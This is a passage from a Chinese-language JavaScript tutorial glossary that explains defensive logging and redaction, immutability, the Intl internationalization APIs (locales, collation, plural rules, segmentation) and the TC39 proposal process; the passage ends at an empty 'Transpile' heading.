**常见误解**：以为「开了 WAF 就够了」或「写了转义就够了」。纵深防御的重点不是堆工具，而是**假设每一层都会失败，问下一层是什么**。

也见 [CSP（内容安全策略）](#csp-content-security-policy内容安全策略)、[Principle of Least Privilege（最小权限原则）](#principle-of-least-privilege最小权限原则)、[Threat Model（威胁模型）](#threat-model威胁模型)。

示例：[`32_security_and_best_practices/19_owasp_checklist.js`](32_security_and_best_practices/19_owasp_checklist.js)

### Sensitive Data Exposure / Log Redaction（敏感信息泄漏与日志脱敏）

敏感信息泄漏指**密码、令牌、身份证号、银行卡号、内部堆栈与配置出现在不该出现的地方**：日志文件、错误响应、监控系统、URL 查询串、以及给前端返回的对象里。它之所以危险，是因为这些通道的**访问控制通常比数据库弱得多**——日志会被采集到第三方平台、错误信息会被用户截图、URL 会进浏览器历史与 Referer 头。防御的核心手段是**两条通道分离 + 出口脱敏**：对内日志保留完整堆栈与 `traceId` 便于排查，对外响应只给一个通用的错误码与 `traceId`（用户报障时凭它到日志里查具体原因），绝不给客户端堆栈、SQL 语句或内部路径；同时对所有输出通道做**统一的脱敏**（`password`、`token`、`authorization`、`set-cookie` 等字段名一律打码），并且从源头避免把敏感字段放进 DTO。

**常见误解**：以为「返回值里删掉 `password` 就行了」。序列化器、日志中间件、异常堆栈、`console.error(err)` 都可能把整个对象打出来；脱敏必须落在**输出边界**上，而不是依赖调用方自觉。

也见 [Structured Logging（结构化日志）](#structured-logging结构化日志)、[DTO（数据传输对象）](#dto数据传输对象data-transfer-object)、[Authentication vs Authorization（认证与授权）](#authentication-vs-authorization认证与授权)。

示例：[`32_security_and_best_practices/08_error_message_hygiene.js`](32_security_and_best_practices/08_error_message_hygiene.js)

### Immutability（不可变数据）

不可变性指数据创建后**不再被修改**，任何「变更」都产生一个新对象。它在安全与正确性上有多重价值：让「不受信任的对象在传递过程中被悄悄加字段」变得不可能（这也是原型污染与参数篡改类漏洞的天然屏障）、让状态变化有迹可循（便于审计与回溯）、让并发与缓存不会有隐性串味。关键细节：JS 里最常见的陷阱是 `Object.freeze()` **只做浅冻结**——`freeze(obj)` 之后 `obj.nested.x = 1` 依然能改，深层冻结需要递归；而 `const` 只保证「绑定不变」，完全不保证内容不变（`const arr = []; arr.push(1)` 完全合法）。实践上更常用**结构化克隆式的不可变更新**（展开运算符逐层复制，或用 `structuredClone` 做深拷贝），代价是深拷贝的开销会随对象大小增长。

**常见误解**：以为「用了 `const` 就不可变」或「`Object.freeze` 能冻结整棵对象树」。这两条都只覆盖表面一层。

也见 [Prototype Pollution（原型污染）](#prototype-pollution原型污染)、[DTO（数据传输对象）](#dto数据传输对象data-transfer-object)、[Memento（备忘录模式）](#memento备忘录模式)。

示例：[`32_security_and_best_practices/06_immutability.js`](32_security_and_best_practices/06_immutability.js)

---

## 国际化与本地化（Intl）

### Internationalization（国际化，i18n）

国际化是**让代码具备适配多种语言与文化的能力**的工程活动：把界面文案从代码里抽出来，把所有随文化而变的格式（数字、日期、货币、姓名顺序、复数词形、排序规则）交给运行时规则决定，而不是硬编码。名称 i18n 取自「internationalization」首尾字母之间恰好 18 个字母。关键细节：国际化是**开发期做一次、长期受益**的架构工作，它不等于翻译，翻译只是其中一环；本仓库所有 `Intl` 示例都是「用内置能力替代手写规则」的示范。判定标准很简单——代码里只要出现 `toFixed(2)`、`'YYYY-MM-DD'`、裸 `arr.sort()` 或手写的 `'元'`，它就还没国际化。

也见 [Localization（本地化，l10n）](#localization本地化l10n)、[Locale（区域设置）](#locale区域设置)。

示例：[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)、[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### Localization（本地化，l10n）

本地化是国际化的**落地执行**：为某个具体 locale 提供译文、日期格式偏好、货币符号、图片与文案语气，产出一份「该地区能直接用」的版本。l10n 取自「localization」首尾之间的 10 个字母。关键区分：i18n 是**改代码结构**（一次性架构投入），l10n 是**加资源内容**（每个 locale 一份，持续维护）；把两者混为一谈会导致「以为多写几份翻译文件就国际化了」，而实际上日期还是 `toLocaleString()` 依赖默认 locale 输出的。**常见误解**：以为 l10n 只是翻译——同一个词在德语里可能比英语长 30%，界面布局被撑破同样属于本地化失败。

也见 [Internationalization（国际化，i18n）](#internationalization国际化i18n)、[Locale（区域设置）](#locale区域设置)。

示例：[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### Locale（区域设置）

Locale 是「语言 + 文化约定」的标识，比如 `zh-CN`、`de-DE`、`ar-EG`，它决定数字怎么分组、日期怎么排、复数用哪种词形、字符串怎么排序。它**不是地理位置**，也不是「语言」本身——`de-DE`（德国德语）和 `de-CH`（瑞士德语）语言相同，但数字千分位和日期习惯不同。关键细节：`Intl` 的所有构造器签名统一为 `new Intl.Xxx(locales, options)`，`locales` 可以是字符串或数组（数组表示按顺序回退），省略时使用**宿主环境默认 locale**——这在开发机、CI、客户服务器上各不相同，是「本地跑得好好的，上线就变英文」的根因。

也见 [BCP 47 Language Tag（BCP 47 语言标签）](#bcp-47-language-tagbcp-47-语言标签)、[Locale Fallback Chain（locale 回退链）](#locale-fallback-chainlocale-回退链)、[Intl Instance Caching（Intl 实例缓存）](#intl-instance-cachingintl-实例缓存)。

示例：[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)、[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)

### BCP 47 Language Tag（BCP 47 语言标签）

BCP 47 是 IETF 定义的语言标签标准（BCP = Best Current Practice），也是 `Intl` 接受的所有 locale 字符串的语法来源：`zh-Hans-CN-u-nu-hanidec-co-pinyin`。结构上由**子标签**用连字符拼成：语言、书写系统、地区、变体、扩展。其中 `-u-` 是 Unicode 扩展，把 locale 相关的选项直接写进标签（`-nu-hanidec` 指定使用汉字数字，`-co-pinyin` 指定拼音排序），效果等同于在 `options` 里传 `{ numberingSystem: 'hanidec' }`。关键细节：标签**大小写不敏感**但规范写法是语言小写、书写系统首字母大写、地区全大写。

也见 [Intl.Locale（Locale 对象）](#intllocalelocale-对象)。

示例：[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)

### Language, Script and Region Subtags（语言、书写系统与地区子标签）

一个标签的三段核心信息：**语言**（`zh`、`en`、`sr`）、**书写系统**（`Latn` 拉丁、`Hans` 简体、`Hant` 繁体、`Cyrl` 西里尔）、**地区**（`CN`、`US`、`TW`）。三者相互独立，组合会产生实质差异：`sr-Cyrl-RS` 与 `sr-Latn-RS` 是同一种语言的两套字母，`zh-Hans-SG` 与 `zh-Hant-TW` 的用词和字形都不同。关键细节：**书写系统子标签是防止「中文排序/字体出错」的关键**——只写 `zh` 时运行时只能靠地区去猜，写全 `zh-Hant` 才明确表达「繁体」。

也见 [BCP 47 Language Tag（BCP 47 语言标签）](#bcp-47-language-tagbcp-47-语言标签)、[CLDR（Unicode 通用语言环境数据库）](#cldrunicode-通用语言环境数据库)。

示例：[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)

### Locale Fallback Chain（locale 回退链）

当请求的 locale 在运行时数据里没有对应实现时，`Intl` 会按**确定性的顺序**逐级降级：先去掉扩展子标签，再去掉地区，最后到语言，仍无匹配则用宿主默认 locale。例如请求 `zh-Hant-TW-u-nu-hanidec`，可能实际退到 `zh-Hant-TW` → `zh-Hant` → `zh` → `en-US`。关键细节：回退是**静默**的——`new Intl.NumberFormat('xx-XX')` 这类「格式合法但不存在」的标签**不报错**，只在 `resolvedOptions().locale` 里暴露真相；而 `'not a locale!'` 这种语法非法的才会抛 `RangeError`。因此线上排查「格式不对」的第一步永远是打印 `resolvedOptions()`。

也见 [Intl Namespace（Intl 命名空间）](#intl-namespaceintl-命名空间)、[Language Negotiation（语言协商）](#language-negotiation语言协商)。

示例：[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)、[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### CLDR（Unicode 通用语言环境数据库）

CLDR（Common Locale Data Repository）是 Unicode 联盟维护的**语言环境规则数据库**：每个 locale 的日期图案、月份名、货币符号、复数规则、排序表、周起始日都在里面。它是 `Intl` 的数据源——JavaScript 语言本身只规定 API 形状（ECMA-402），具体「俄语的 2 是 few 还是 many」来自 CLDR。关键细节：CLDR 会随国家改名、货币改版、时区调整而**持续更新**，而 `Intl` 跟随运行时更新，这正是「不要手写这些规则、不要长期依赖第三方翻译包」的根本理由。

也见 [ICU and tzdata（ICU 与时区数据库）](#icu-and-tzdataicu-与时区数据库)。

示例：[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)

### ICU and tzdata（ICU 与时区数据库）

ICU（International Components for Unicode）是把 CLDR 数据**编译成可查询的库**的实现，Node 与浏览器都靠它提供 `Intl` 的数据；tzdata（IANA 时区数据库）则提供「每个地区历史上偏移多少小时、哪年改过夏令时」的信息。二者是分开打包的，所以会出现「ICU 里有时区名字，但 tzdata 版本旧导致 2023 年某国取消夏令时的变更没生效」这种问题。关键细节：Node 的 `Intl` **只在有 ICU 时才完整**，而 tzdata 版本决定了跨零点、跨夏令时计算的正确性——这类 bug 通常在一年中特定几天才复现。

也见 [full-icu and small-icu（完整 ICU 与精简 ICU）](#full-icu-and-small-icu完整-icu-与精简-icu)。

示例：[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### full-icu and small-icu（完整 ICU 与精简 ICU）

Node 可以按三种方式构建：`full-icu`（内置全部 locale 数据）、`small-icu`（只内置 `en-US`）、`system-icu`（链接系统库）。官方二进制发行版默认是 full-icu，但**嵌入式设备、Alpine 容器、自编译版本常是 small-icu**。后果是：代码在开发机输出「1,234.56 元」，到客户环境退化成「1,234.56」甚至英文月份，而且**不报任何错**。关键细节：检测手段就是 `new Intl.NumberFormat('zh-CN').resolvedOptions().locale` 是否为 `zh-CN`，或 `Intl.supportedValuesOf('timeZone').length` 是否正常；必要时可通过 `NODE_ICU_DATA` 或 `--icu-data-dir` 外挂数据。

也见 [ICU and tzdata（ICU 与时区数据库）](#icu-and-tzdataicu-与时区数据库)、[Locale Fallback Chain（locale 回退链）](#locale-fallback-chainlocale-回退链)。

示例：[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### Intl Namespace（Intl 命名空间）

`Intl` 是 ECMA-402 在语言里暴露的全局命名空间，把国际化能力做成**语言内置**而非第三方库。它是一个**普通对象，不是构造函数**——`Intl()` 会抛 `TypeError`。成员包括全部构造器（`NumberFormat`、`DateTimeFormat`、`Collator`、`PluralRules`、`ListFormat`、`Segmenter`、`DisplayNames`、`Locale`、`RelativeTimeFormat`）和静态工具（`Intl.supportedValuesOf`、各构造器的 `supportedLocalesOf`）。所有实例都遵循同一套契约：一个核心方法（`format` / `compare` / `select`）+ `resolvedOptions()` 返回**实际生效**的选项。

也见 [Locale Fallback Chain（locale 回退链）](#locale-fallback-chainlocale-回退链)、[Intl Instance Caching（Intl 实例缓存）](#intl-instance-cachingintl-实例缓存)。

示例：[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)

### Intl.NumberFormat（数字格式化）

`Intl.NumberFormat` 按 locale 规则格式化数字：小数位、千分位、货币符号与位置、百分号、单位、紧凑记数法（`compactDisplay` 的「1.2 万」/「1.2M」）。它是替代 `toFixed(2)` 的正确工具——`toFixed` 只保证小数位，分组符和货币位置全靠自己拼，必然出错。关键细节：同一份选项在不同 locale 下差异巨大（德语 `1.234,56` 与英语 `1,234.56` 的点和逗号正好相反）；**格式化结果不可逆**，`format()` 出来的字符串不能再 `parseInt` 回去，金额解析必须走固定协议。

也见 [Intl Instance Caching（Intl 实例缓存）](#intl-instance-cachingintl-实例缓存)、[Encoding, Encryption and Hashing（编码、加密与哈希）](#encoding-encryption-and-hashing编码加密与哈希)。

示例：[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)、[`33_intl/06_intl_display_names.js`](33_intl/06_intl_display_names.js)

### Intl.DateTimeFormat（日期时间格式化）

`Intl.DateTimeFormat` 把时间戳渲染成 locale 习惯的日期时间串：`2024/3/5`、`3/5/2024`、`٥‏/٣‏/٢٠٢٤` 都在同一个 API 下产生，还包括月份全名、星期、相对时间（`Intl.RelativeTimeFormat`）等形式。关键细节：它**默认使用宿主时区**，同一时间戳在开发机（Asia/Shanghai）和服务器（UTC）会输出不同日期——跨零点的订单、账单日、打卡记录都会因此差一天，所以涉及时间必须显式传 `timeZone: 'Asia/Shanghai'` 这类 IANA 名称，并理解 UTC 与夏令时。另外 `Intl` **只格式化不解析**，把展示串再 `new Date()` 回去是典型的错误做法。

也见 [ICU and tzdata（ICU 与时区数据库）](#icu-and-tzdataicu-与时区数据库)、[Intl Instance Caching（Intl 实例缓存）](#intl-instance-cachingintl-实例缓存)。

示例：[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)、[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### Intl.Collator（本地化比较器）

`Intl.Collator` 提供 `compare(a, b)` 方法，用某个 locale 的规则比较字符串，专供 `Array.prototype.sort()` 和 `localeCompare` 使用。它的行为与 `<`/`>` 完全不同：后者按 UTF-16 码元逐位比较，结果对人不友好也不正确（`'Z' < 'a'` 为真、`'10' < '9'` 为真）。关键选项有：`sensitivity`（base/ accent / case 是否参与比较）、`numeric`（自然排序）、`collation`（指定排序变体）、`ignorePunctuation`、`caseFirst`。关键细节：`new Intl.Collator(...).compare` 是一个**绑定函数**，可以直接 `arr.sort(collator.compare)` 传出去，不需要再包一层箭头函数。

也见 [Collation（排序规则）](#collation排序规则)、[Pinyin Collation（拼音排序）](#pinyin-collation拼音排序)、[Natural Sort（自然排序）](#natural-sort自然排序)。

示例：[`33_intl/02_intl_collator.js`](33_intl/02_intl_collator.js)

### Collation（排序规则）

Collation 是「字符串如何排序」的规则集，由 CLDR 按 locale 提供：拼音、笔画、注音、德语电话簿序（`phonebk`，把 `ö` 当作 `oe`、`ß` 当作 `ss`）等都是不同 collation。它决定了「张三」和「李四」谁在前——不是字符编码决定的，是文化约定决定的。关键细节：可以用 `-u-co-` 扩展写进标签（`'zh-CN-u-co-pinyin'`），也可以走 `options.collation`；CLDR 对 `zh` 的**默认值就是 pinyin**，所以 `zh-CN` 下不传 `collation` 也已是拼音序。**常见误解**：以为「排序规则是全局的」——同一个 `Intl.Collator` 实例不能跨 locale 复用结论，服务端按 `en-US` 排的结果不能直接拿来给中文用户看。

也见 [Pinyin Collation（拼音排序）](#pinyin-collation拼音排序)、[Intl.Collator（本地化比较器）](#intlcollator本地化比较器)。

示例：[`33_intl/02_intl_collator.js`](33_intl/02_intl_collator.js)

### Pinyin Collation（拼音排序）

拼音排序是中文场景最常用的 collation，写作 `'zh-CN-u-co-pinyin'` 或 `{ collation: 'pinyin' }`，效果是「按汉语拼音字母顺序排汉字」：`阿` 在 `包` 前，`包` 在 `陈` 前。它是 `zh` 的默认排序规则，但**与笔画序（`stroke`）、注音序兼容序（`zhuyin`）结果完全不同**，中文通讯录、城市列表、字典索引对排序方式有明确要求。关键细节：拼音排序在**同音字之间**仍然需要一套内部规则（CLDR 用字形/笔画近似），所以「拼音序」不等于「严格按拼音」；对排序结果有硬性要求时应把结果与预期表比对，而不是假设。

也见 [Collation（排序规则）](#collation排序规则)。

示例：[`33_intl/02_intl_collator.js`](33_intl/02_intl_collator.js)

### Natural Sort（自然排序）

自然排序（又叫 numeric sort）是让「含数字的字符串」按人预期排序的模式，通过 `{ numeric: true }` 开启：`['file1','file2','file10']` 而不是字典序的 `['file1','file10','file2']`。它的核心是**在比较的当前位置把连续数字当数值比较**，而不是逐个字符比码点。关键细节：`numeric` 只在「同位置都是数字串」时生效，`'a1'` 与 `'a01'` 在 `en-US` 下会被视为**相等**（`compare` 返回 0），这会让依赖稳定排序的代码产生意料之外的顺序；版本号、文件名、章节号（`第2章` 与 `第10章`）是最典型的受益场景。

也见 [Intl.Collator（本地化比较器）](#intlcollator本地化比较器)。

示例：[`33_intl/02_intl_collator.js`](33_intl/02_intl_collator.js)

### Intl.PluralRules（复数规则）

`Intl.PluralRules` 回答的问题是「这个数字该配哪种词形」：`select(1)` 返回 `'one'`、`select(3)` 返回 `'other'`，中文永远返回 `'other'`，俄语可能返回 `'one'`/`'few'`/`'many'`。它**不做翻译**，只返回类别名，你的文案表再按类别取词。关键选项是 `type: 'cardinal'`（默认，基数「1 个」）与 `type: 'ordinal'`（序数「第 1 个」）。关键细节：`selectRange(start, end)` 用于「1–2 件」这类范围文案，且**结果不一定等于两端 select 的结果**——`en-US` 里 `select(1)` 是 `'one'`，但 `selectRange(1,1)` 是 `'other'`。

也见 [Plural Category（复数类别）](#plural-category复数类别)、[Ordinal（序数词）](#ordinal序数词)。

示例：[`33_intl/03_intl_plural_rules.js`](33_intl/03_intl_plural_rules.js)

### Plural Category（复数类别）

复数类别是 CLDR 定义的六个取值：`zero`、`one`、`two`、`few`、`many`、`other`。不同语言用到的子集不同：英语只用 `one`/`other`，阿拉伯语六个全用，中文只用 `other`，俄语用 `one`/`few`/`many`/`other`。**`other` 是必需的最后兜底**——规范保证 `select()` 一定会返回一个类别，但你的文案表必须至少提供 `other`，否则运行时会取到 `undefined` 并渲染出 `undefined 件商品`。关键细节：类别是按**规则**算出来的，不是按数字大小简单划分的：俄语里 11 属于 `many`，而 21 又回到 `one`。

也见 [Intl.PluralRules（复数规则）](#intlpluralrules复数规则)。

示例：[`33_intl/03_intl_plural_rules.js`](33_intl/03_intl_plural_rules.js)

### Ordinal（序数词）

序数词是「第几」的表达（英语 1st / 2nd / 3rd / 4th），与基数词「几个」是**两套独立的规则**，用 `new Intl.PluralRules(locale, { type: 'ordinal' })` 获取类别。英语的序数规则很反直觉：`1 → one`、`2 → two`、`3 → few`、`4 → other`，但 `11/12/13 → other`，`21 → one`。关键细节：**中文没有序数词的词形变化**，「第 1 个」直接拼即可，所以中文项目里序数规则常被忽略，一旦做多语言（英语、法语 `1er`、德语 `1.`）就会暴露；用 `type` 而不是另写一套判断表，是唯一可维护的写法。

也见 [Plural Category（复数类别）](#plural-category复数类别)。

示例：[`33_intl/03_intl_plural_rules.js`](33_intl/03_intl_plural_rules.js)

### Intl.ListFormat（列表格式化）

`Intl.ListFormat` 把数组连接成符合 locale 习惯的自然语言列表：中文 `「张三、李四和王五」`，英文 `"Alice, Bob, and Carol"`，并支持 `type: 'disjunction'` 的「或者」形式（`A、B 或 C`）。它是替代 `arr.join('、')` 或 `join(', ')` 的正确工具——后者在英文里会漏掉最后的 and，在中文里会漏掉「和」。关键细节：`style` 有 `long`/`short`/`narrow` 三档，影响连接词的长度与标点；`format()` 接收的是**可迭代对象**，元素会被当作字符串原样使用，所以列表里的名称要自己先格式化好。

也见 [Intl Instance Caching（Intl 实例缓存）](#intl-instance-cachingintl-实例缓存)。

示例：[`33_intl/04_intl_list_format.js`](33_intl/04_intl_list_format.js)

### Intl.Segmenter（分词器）

`Intl.Segmenter` 是「按语言规则切分字符串」的构造器，通过 `granularity` 选择三种粒度：`'grapheme'`（字素簇，用户感知的一个字符）、`'word'`（词，带 `isWordLike` 标记）、`'sentence'`（句子）。它是**唯一**能正确完成「按用户感知切字」「按词统计」「句级断行」的标准工具，`split('')`、`split(' ')`、正则 `\b` 全都做不到。关键细节：`segment()` 返回的是**可迭代对象**，每一项形如 `{ segment, index, input, isWordLike }`；`isWordLike` 只在 `word` 粒度存在（标点、空格、emoji 为 `false`）；`containing(index)` 可以反查某个下标属于哪一段。

也见 [Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)、[Word Boundary（词边界）](#word-boundary词边界)。

示例：[`33_intl/05_intl_segmenter.js`](33_intl/05_intl_segmenter.js)

### Grapheme Cluster（字素簇）

用户眼中「一个字符」的实际单位，可能由多个码点组合而成：`'👨‍👩‍👧‍👦'.length` 是 11（UTF-16 码元），`[...str].length` 是 7（码点），而字素簇只有 **1**。国旗、带变音符的字母、emoji 组合序列都属于这种情况。凡是需要「按用户感知的字符」做计数、截断或光标移动的地方（如输入框字数统计、摘要截断），都必须用 `Intl.Segmenter` 按字素簇切分，否则会把一个 emoji 拦腰截断成乱码。

也见 [Intl.Segmenter（分词器）](#intlsegmenter分词器)、[Code Point and Code Unit（码点与码元）](#code-point-and-code-unit码点与码元)。

示例：[`33_intl/05_intl_segmenter.js`](33_intl/05_intl_segmenter.js)

### Word Boundary（词边界）

词边界是「一个词从哪里开始、到哪里结束」的位置，中文、日文、泰文**没有空格分隔**，所以正则的 `\b` 与 `split(' ')` 在这些语言上完全失效（`\b` 只认 ASCII 词字符与非词字符的交界）。`Intl.Segmenter` 的 `word` 粒度用 CLDR 的分词规则（含词典）给出正确的词边界，并区分「实词」与「标点/空白」。关键细节：做关键词提取、高亮、字数统计时必须过滤 `isWordLike === false` 的段，否则标点和空格也会被算成词；中文分词结果与专业 NLP 分词器相比粒度较粗，`Intl` 的目标是「符合语言习惯」，而不是「语言学最细」。

也见 [Intl.Segmenter（分词器）](#intlsegmenter分词器)、[Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)。

示例：[`33_intl/05_intl_segmenter.js`](33_intl/05_intl_segmenter.js)

### Intl.DisplayNames（名称显示）

`Intl.DisplayNames` 把**代码**翻译成人类可读的本地化名称：语言（`'zh'` → 「中文」）、地区（`'CN'` → 「中国」）、货币（`'CNY'` → 「人民币」）、书写系统、日期字段（`'month'` → 「月」）。它是「把数据库里存的 `de-DE` 渲染给用户看」的标准做法，避免了在代码里维护一张「语言代码 → 中文名」的静态表（那张表必然过时，而且反过来还要维护「中文名 → 代码」）。关键细节：必须传 `type` 参数，`fallback` 决定查不到时返回原代码还是 `undefined`；`of()` 对非法代码会返回 `undefined` 而不抛错，调用处要兜底。

也见 [BCP 47 Language Tag（BCP 47 语言标签）](#bcp-47-language-tagbcp-47-语言标签)。

示例：[`33_intl/06_intl_display_names.js`](33_intl/06_intl_display_names.js)

### Intl.Locale（Locale 对象）

`Intl.Locale` 把语言标签解析成**结构化对象**并做推导：`new Intl.Locale('zh-Hans-CN-u-nu-hanidec')` 后可以读 `language`、`script`、`region`、`numberingSystem`、`calendar`，也可以通过 `getCalendars()` / `getTimeZones()` / `getWeekInfo()`（取代已废弃的属性形式）拿到该 locale 的约定，例如「一周从周几开始」。它还提供两个关键推导方法：`maximize()` 补全成 CLDR 认为最可能的完整标签（`en` → `en-Latn-US`），`minimize()` 反向省略可推导的部分。**常见误解**：`maximize()` 是**猜测不是事实**（英式用户也可能是 `en-GB`）；`minimize()` **不可逆**（`zh-Hans-CN` 与 `zh-Hans-SG` 都变成 `zh`），所以推导结果不要写进数据库。

也见 [Language Negotiation（语言协商）](#language-negotiation语言协商)。

示例：[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)

### Language Negotiation（语言协商）

语言协商是在多个候选 locale 之间**选出实际使用哪一个**的过程：拿到浏览器的 `Accept-Language`（如 `zh-CN,zh;q=0.9,en;q=0.8`）或 `navigator.languages` 数组后，从前到后找出第一个你的应用真正支持的 locale，找不到就走默认值。关键细节：**不要自己做字符串前缀匹配**（`startsWith('zh')` 会把 `zh-Hant` 当成 `zh-Hans`、把 `zh-TW` 匹配到简体资源），正确做法是 `Intl.Xxx.supportedLocalesOf(candidates)` 批量探测，或借助 `new Intl.Locale(tag).maximize()` 做标签级的近似匹配。协商结果要**固定下来**（存 cookie/用户配置），否则用户换设备、换浏览器语言时界面语言会突变。

也见 [Locale Fallback Chain（locale 回退链）](#locale-fallback-chainlocale-回退链)、[Intl.Locale（Locale 对象）](#intllocalelocale-对象)。

示例：[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)、[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)

### RTL（从右到左布局）

RTL（right-to-left）指阿拉伯语、希伯来语、波斯语等语言的书写方向，整个界面的布局需要**镜像**：导航栏、图标方向、进度条、表格列序都要翻转。在 Web 上的正确实现方式是 CSS 逻辑属性（`margin-inline-start`、`padding-inline-end`、`text-align: start`）配合 `<html dir="rtl">`，让同一份 CSS 自动适配两个方向。关键细节：**语言方向是有数据的**，不该靠语言代码硬编码判断——可以通过 `Intl.Locale` 的 `textInfo`/`getTextInfo()` 拿到 `direction`，让新增语言时不改代码。**常见误解**：以为 RTL 只是「文字右对齐」——嵌在 RTL 文本里的数字和拉丁字母仍然保持 LTR，这是 Unicode 双向算法（bidi）负责的，`dir` 只负责块级布局。

也见 [Intl.Locale（Locale 对象）](#intllocalelocale-对象)、[Locale（区域设置）](#locale区域设置)。

示例：[`33_intl/07_intl_locale.js`](33_intl/07_intl_locale.js)

### Intl Instance Caching（Intl 实例缓存）

`Intl` 的每个构造器在 `new` 的时候都要做一次「locale 协商 + 数据装配 + 选项解析」，代价远高于后续的 `format()` 调用；在循环或渲染函数里反复 `new Intl.NumberFormat(...)` 会直接变成 CPU 热点（本仓库实测约慢 60 倍）。正确做法是**按 `(locale, options)` 组合建立模块级缓存**，把实例复用到进程结束。关键细节：缓存的 key 必须包含全部影响输出的选项（locale、`timeZone`、`currency`、`numberingSystem`……），只按 locale 缓存会导致「同一个 locale 不同货币格式串味」；另外缓存实例是**线程/请求安全**的，因为 `format()` 是无状态的纯函数。

也见 [Intl Namespace（Intl 命名空间）](#intl-namespaceintl-命名空间)。

示例：[`33_intl/08_intl_best_practices.js`](33_intl/08_intl_best_practices.js)、[`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)

## 现代 ES 特性（ECMAScript 演进）

### ECMAScript（ECMAScript 标准）

ECMAScript 是 JavaScript 的**语言标准**（规范编号 ECMA-262），由 Ecma International 发布；「JavaScript」是实现该标准的语言的习惯叫法，还包含宿主环境（浏览器/Node）提供的额外 API（DOM、`fs` 等）。规范本身**不定义** `console.log`、`setTimeout`、`document`，这些属于宿主或 WHATWG/W3C 标准。关键细节：讲「ES 特性」时指的是语言层面的语法与内置对象（`Array.prototype.at`、类字段、`Promise.try`），而 `Web Crypto`、`ReadableStream` 属于 Web 平台标准，二者发布节奏不同、兼容性策略也不同。

也见 [TC39（TC39 委员会）](#tc39tc39-委员会)、[ES Release Year（ES 年度版本）](#es-release-yeares-年度版本)。

示例：[`34_modern_es_features/01_es2021_features.js`](34_modern_es_features/01_es2021_features.js)

### TC39（TC39 委员会）

TC39 是 Ecma 下属、负责**制定 ECMAScript 标准**的技术委员会，成员来自各家浏览器厂商与社区。它的产出不是「浏览器实现」而是**规范文本**，浏览器与 Node 再按规范实现。关键细节：TC39 的运作是**共识制**（consensus），任何提案都必须让所有成员「不反对」才能推进，因此流程保守、周期长；规范文本比实现更权威，遇到「Chrome 能跑、Firefox 不行」的差异时，判断谁对要看规范而不是工具。日常开发中与 TC39 打交道的方式就是——看提案处于哪个 Stage。

也见 [Proposal Process（提案流程与 Stage 0–4）](#proposal-process提案流程与-stage-04)、[ECMAScript（ECMAScript 标准）](#ecmascriptecmascript-标准)。

示例：[`34_modern_es_features/05_es2025_iterator_helpers.js`](34_modern_es_features/05_es2025_iterator_helpers.js)

### Proposal Process（提案流程与 Stage 0–4）

TC39 用五级 Stage 描述一个提案的成熟度，是**判断「能不能在生产环境用」的唯一可靠依据**：Stage 0（想法）、Stage 1（问题与方向被认可，可能大改）、Stage 2（规范草案成形，语法基本定型）、Stage 2.7（规范文本与测试就绪）、Stage 3（规范完成、等待实现与反馈，此时引擎开始实现）、Stage 4（两个独立实现通过测试，正式并入规范）。关键细节：**Stage 3 是「可以谨慎使用、需要 polyfill 或转译」的分界线**，Stage 4 才是「已进标准」；Stage 2 及以前的语法随时可能改名或删除，绝对不要在生产代码里用。

也见 [ES Release Year（ES 年度版本）](#es-release-yeares-年度版本)、[Polyfill（垫片）](#polyfill垫片)。

示例：[`34_modern_es_features/05_es2025_iterator_helpers.js`](34_modern_es_features/05_es2025_iterator_helpers.js)、[`34_modern_es_features/07_promise_try_and_regexp_escape.js`](34_modern_es_features/07_promise_try_and_regexp_escape.js)

### ES Release Year（ES 年度版本）

从 ES2015（即 ES6，2015 年发布，是史上最大的一次改版）开始，ECMAScript **改为每年发布一版**，用年份命名：ES2016、ES2017……一直到 ES2025。命名上 `ES6` = `ES2015`，`ES7` 之类的旧叫法在 ES2015 之后就废弃了（因为没有 ES7 这个正式版本号）。关键细节：**特性属于哪一版，与浏览器什么时候支持它是两件事**——一个特性可能 ES2022 进规范、Chrome 2020 就先实现了；反之某个 ES2023 特性在某些环境至今缺失，所以判断可用性永远要**特性检测**而不是「查版本号」。

也见 [Feature Detection（特性检测）](#feature-detection特性检测)、[ECMAScript（ECMAScript 标准）](#ecmascriptecmascript-标准)。

示例：[`34_modern_es_features/02_es2022_features.js`](34_modern_es_features/02_es2022_features.js)、[`34_modern_es_features/04_es2024_features.js`](34_modern_es_features/04_es2024_features.js)

### Polyfill（垫片）

Polyfill 是**在运行时**用纯 JavaScript 补上当前环境缺失的**内置对象或方法**，例如给老环境补一个 `Array.prototype.at` 或 `Object.groupBy`。它适用于「API 缺失」的场景，通常做法是 `if (!Array.prototype.at) { Array.prototype.at = function (n) { ... } }`。关键细节：polyfill 有三重代价——**性能**（纯 JS 实现通常比原生慢，`groupBy` 尤其明显）、**语义漂移**（很难 100% 复刻规范细节，例如用 JSON 深拷贝冒充 `structuredClone` 会不支持循环引用与 Map/Set，代码还能跑但结果错了）、**可维护性**（几年后没人敢删）。引 polyfill 要按需，而不是无脑 `import 'core-js'`。

也见 [Transpile（转译）](#transpile转译)、[Syntax Feature vs API Feature（语法特性与 API 特性）](#syntax-feature-vs-api-feature语法特性与-api-特性)。

示例：[`01_syntax_basics/06_language_versions_and_compatibility.js`](01_syntax_basics/06_language_versions_and_compatibility.js)

### Transpile（转译）

